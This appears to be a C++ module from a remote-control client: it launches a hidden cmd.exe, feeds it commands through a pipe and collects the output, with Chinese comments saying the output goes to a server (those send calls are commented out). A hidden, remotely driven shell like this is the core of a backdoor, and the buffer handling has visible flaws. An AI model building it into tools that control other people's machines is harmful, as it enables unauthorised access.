#include "MyCmd.h"

PROCESS_INFORMATION pi = { 0 };
bool bRetCmd = false;

//extern size_t sendout;

MyCmd::MyCmd(SOCKET socket, char * pData, int nlen)
	:m_socket{ socket }, m_pData{ pData }, m_nlen{nlen}
{
}

MyCmd::~MyCmd()
{
}

typedef struct tagMyData
{
	HANDLE hWrite; //hMyWrite
	int nLen;
	char* pCmd;
	//命令参数//char*需要分配内存，切记 ，c/c++参数的初始化（内存），内存的分配和释放，写在这里给自己个提醒
}MYDATA;

MYDATA tagData = { 0 };

bool MyCmd::CreateCmd()
{
	HANDLE hMyWrite = NULL;
	HANDLE hCmdRead = NULL;
	HANDLE hMyRead = NULL;
	HANDLE hCmdWrite = NULL;

	SECURITY_ATTRIBUTES sa;
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.bInheritHandle = true;
	sa.lpSecurityDescriptor = nullptr;

	BOOL bRet = CreatePipe(
		&hCmdRead,
		&hMyWrite,
		&sa,
		0);

	if (!bRet) {
		return false;
	}

	bRet = CreatePipe(
		&hMyRead,
		&hCmdWrite,
		&sa,
		0);
	if (!bRet) {
		return false;
	}

	char szBuf[256] = "cmd.exe";

	STARTUPINFOA si = { 0 };
	si.cb = sizeof(STARTUPINFOA);

	si.dwFlags = STARTF_USESTDHANDLES;
	si.hStdInput = hCmdRead;
	si.hStdOutput = hCmdWrite;
	si.hStdError = hCmdWrite;

	//PROCESS_INFORMATION pi = { 0 };

	//创建进程
	bRetCmd = CreateProcessA(NULL,
		szBuf,
		NULL,
		NULL,
		TRUE,
		CREATE_NO_WINDOW,
		NULL,
		NULL,
		&si,
		&pi);

	if (!bRetCmd) {
		return false;
	}

	tagData.hWrite = hMyWrite;

	DWORD dwBytesRead = 0;            // number of bytes read
	DWORD dwTotalBytesAvail = 0;      // number of bytes available
	DWORD dwBytesLeftThisMessage = 0;

	while (true) {
		DWORD dwReadedBytes = 0;
		dwBytesRead = 0; 
		dwTotalBytesAvail = 0;
		dwBytesLeftThisMessage = 0;
		memset(szBuf, 0, 256);

		bRet = PeekNamedPipe(
			hMyRead,
			NULL,
			0,
			&dwBytesRead,
			&dwTotalBytesAvail,
			&dwBytesLeftThisMessage);

		if (!bRet) {
			break;
		}

		if (dwTotalBytesAvail > 0) {
			bRet = ReadFile(hMyRead, szBuf, 255, &dwReadedBytes, NULL);
			if (!bRet) 
			{
				break;
			}

			//往服务端发送数据
			m_nCount += strlen(szBuf);
			//SendData(m_socket, MSG_CMD, szBuf, strlen(szBuf));
		}
		else
		{
			Sleep(2000);
			if (m_nCount > 0)
			{
				if (m_pData)
				{
					delete[] m_pData;
					m_pData = nullptr;
				}
				char buf[256] = { 0 };
				_itoa(m_nCount, buf, 10);
				//256    3
				//SendData(m_socket, MSG_CMD_STOP, buf, strlen(buf));
			}			
		}
	}

	return true;
}

void MyCmd::SetCmdLine(char* pData, int nlen)
{
	m_pData = new char[nlen+10];
	memset(m_pData, 0, nlen);
	strcpy_s(m_pData, nlen, pData);

	strcat_s((char*)m_pData, nlen + 10, "\n");

	//写入到对应的管道中
	DWORD dwWritedBytes = 0;
	BOOL bRet = WriteFile(
						tagData.hWrite,
						m_pData,
						strlen(m_pData),
						&dwWritedBytes,
						NULL);
}
